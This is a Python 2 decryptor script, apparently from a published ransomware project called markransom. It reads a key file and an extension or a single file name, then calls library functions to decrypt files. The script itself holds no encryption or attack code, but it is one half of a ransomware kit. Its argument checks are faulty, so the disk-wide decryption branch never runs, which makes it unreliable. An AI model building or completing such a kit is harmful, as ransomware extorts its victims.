#!/usr/bin/env python
# -*- coding: utf-8 -*-
# markransom.py - decipher
# https://www.github.com/R3nt0n/markransom


__author__ = "r3nt0n"
__license__ = "GPL 3.0"
__version__ = "1.0.0"
__email__ = "r3nt0n@protonmail.com"
__status__ = "Development"

import os, sys
import argparse

from lib.cryptor import find_root_paths, find_files_and_do, decipher



def proc_args():
    parser = argparse.ArgumentParser(description='Decrypt files encrypted with markransom.py.')
    parser.add_argument('-k', '--key', action="store", metavar='file',type=str,dest='key', required=True,
                        help='the file which includes the key')
    parser.add_argument('-e', '--extension', action="store", metavar='.ext', type=str, dest='ext',
                        help='encrypted files extension')
    parser.add_argument('-f', '--file', action="store", metavar='file', type=str,dest='crypted_file', default='False',
                        help='decrypt a single file')
    args = parser.parse_args()
    key = args.key
    ext = args.ext
    crypted_file = args.crypted_file
    if not (ext and crypted_file):
        print 'Too few arguments, -e or -f are required. Exiting...'
        sys.exit(3)

    return key,ext,crypted_file


def main():
    # Proc args
    key, ext, crypted_file = proc_args()
    e = []
    e.append(ext)
    file_list = []
    # Find files
    if crypted_file:
        status = decipher(crypted_file, key, ext)
    else:
        root_paths = find_root_paths()
        file_list = find_files_and_do(root_paths, e, key, action='decrypt', crypted_ext=ext)


if __name__ == '__main__':
    main()
